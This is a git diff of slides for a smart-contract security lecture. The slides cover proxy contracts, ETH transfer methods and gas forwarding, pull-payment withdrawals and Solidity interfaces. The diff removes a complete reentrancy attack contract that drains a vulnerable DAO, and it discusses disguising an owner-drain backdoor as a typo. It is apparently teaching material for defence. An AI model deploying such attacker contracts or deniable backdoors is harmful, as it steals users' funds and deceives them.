@@ -171,9 +171,11 @@
     }
 </pre>
 
-* This bug lets owner drain the contract
-* But if detected, the owner can claim:
-  * *Oops sorry! It was just a typo, I wasn't trying to steal your money, I promise!*
+* Should be `-=`, not `=-`
+* This bug lets owner streal all ETH in contract
+  * Why?
+* But, if detected, owner can claim:
+  * *Oops sorry. It was just a typo, I wasn't trying to steal your money, I promise*
 
 </script></section>
 
@@ -195,12 +197,64 @@
 
 ## Proxy contracts
 
-* Upgradable contracts are implemented using proxy contracts
+* Because a contract's code cannot be changed, upgradable contracts are implemented using proxy contracts
 * A simple contract lives at a stable address
-  * It forwards all requests to another contract, at an address that can be changed by the owner
+  * It sends all requests to another contract, at an address that can be changed by the owner
 * Inter-contract interaction like this needs to be considered carefully from a security perspective
 
 </script></section>
+
+
+
+
+
+<section data-markdown><script type="text/template">
+
+## transfer is a function call
+
+* Recall that a transaction can do either or both:
+  * Send ETH
+  * Invoke a function on a contract
+* When you call `transfer()` you are:
+  * Sending ETH
+  * *and* invoking the target's fallback function (if it exists)
+
+</script></section>
+
+
+
+
+<section data-markdown><script type="text/template">
+
+## Forwarding gas
+
+* When you call another contract's function, you can choose how much gas to "forward" to it
+  * Forward just means the amount of your own gas you are allowing it to burn
+* `transfer` forwards 2,300 gas
+  * Small amount: Just enough for the fallback function to log an event
+  * But not enough to do certain bad things (discussed soon)
+
+</script></section>
+
+
+
+
+<section data-markdown><script type="text/template">
+
+## Different ways to send ETH
+
+* `address.transfer(amount)`
+  * Throws error on failure
+  * Forwards 2,300 gas
+* `address.send(amount)`
+  * <span class="highlightRed">Returns false on failure</span>
+  * Forwards 2,300 gas
+* `address.call.value(amount)("")`
+  * <span class="highlightRed">Returns false on failure</span>
+  * <span class="highlightRed">Forwards all available gas</span>
+
+</script></section>
+
 
 
 
@@ -231,14 +285,14 @@
 
 * It is better to record how much each address is owed:
 <pre class="hljs js">
-    balances[addr1] += payout1;
-    balances[addr2] += payout2;
+    owed[addr1] += payout1;
+    owed[addr2] += payout2;
 </pre>
 * And then allow each address to claim their payouts separately:
 <pre class="hljs js">
-    function withdraw() {
-        uint256 amount = balances[msg.sender];
-        balance[msg.sender] = 0;
+    function withdraw() public {
+        uint256 amount = owed[msg.sender];
+        owed[msg.sender] = 0;
         msg.sender.transfer(amount);
     }
 </pre>
@@ -247,22 +301,40 @@
 
 
 
+
 <section data-markdown><script type="text/template">
 
-## Different ways to send ETH
+## Interfaces
 
-* `address.transfer(amount)`
-  * Throws on failure
-  * Forwards 2,300 gas stipend
-  * Use this whenever possible
-* `address.send(amount)`
-  * Returns false on failure
-  * Forwards 2,300 gas stipend
-* `address.call.value(amount)("")`
-  * returns false on failure
-  * Forwards all available gas
+* An interface is a `contract` definition that just lists available functions:
+<pre class="hljs js">
+contract VaultInterface {
+    function balance() public view returns(uint256);
+    function deposit() public payable;
+    function withdraw(uint256 amount) public;
+}
+</pre>
+* Then in your contract, you can use it to treat an `address` as a contract and call functions on it:
+<pre class="hljs js">
+    VaultInterface v = VaultInterface(vaultAddr);
+    uint256 myBalance = v.balance(address(this));
+    v.deposit.value(1 ether)();
+    v.withdraw(1 ether);
+</pre>
 
 </script></section>
+
+
+
+
+<section data-markdown><script type="text/template">
+
+## Exercise
+
+[atomic-operations.html](atomic-operations.html)
+
+</script></section>
+
 
 
 
@@ -288,18 +360,6 @@
 </script></section>
 
 
-
-<section data-markdown><script type="text/template">
-
-## Forwarding gas
-
-* We noted before that `transfer` forwards 2,300 gas
-* If sending to a contract, this lets the fallback function run a little bit of code
-* Why would we want to do this?
-  * The fallback function may want to record something when it accepts ETH
-  * Sending ETH is a special case of calling another contract
-
-</script></section>
 
 
 
@@ -457,42 +517,6 @@ contract SimpleDAO {
 </script></section>
 
 
-
-
-<section data-markdown><script type="text/template">
-
-<pre class="hljs js">
-pragma solidity ^0.5.0;
-
-contract SimpleDaoInterface {
-    function deposit() public payable;
-    function withdraw(uint amount) public;
-}
-
-contract Hacker {
-    address simpleDaoAddr;
-    
-    function hack(address addr) public payable {
-        simpleDaoAddr = addr;
-
-        SimpleDaoInterface simpleDao = SimpleDaoInterface(simpleDaoAddr);
-        simpleDao.deposit.value(1 ether)();
-        simpleDao.withdraw(1 ether);
-        
-        selfdestruct(msg.sender);
-    }
-
-    function () external payable {
-        uint256 balance = simpleDaoAddr.balance;
-        if (balance == 0) return;
-        if (balance > 1 ether) balance = 1 ether;
-        SimpleDaoInterface simpleDao = SimpleDaoInterface(simpleDaoAddr);
-        simpleDao.withdraw(balance);
-    }
-}
-</pre>
-
-</script></section>
 
 
 <section data-markdown><script type="text/template">
